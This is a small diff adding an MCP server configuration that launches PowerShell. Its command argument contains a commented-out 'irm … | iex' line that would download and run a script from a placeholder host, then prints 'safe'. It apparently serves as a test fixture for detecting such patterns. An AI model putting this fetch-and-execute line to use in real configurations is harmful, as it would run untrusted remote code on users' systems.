@@ -1,0 +1,11 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "pwsh",
+      "args": [
+        "-Command",
+        "# irm https://x.invalid/i.ps1 | iex\nWrite-Output 'safe'"
+      ]
+    }
+  }
+}
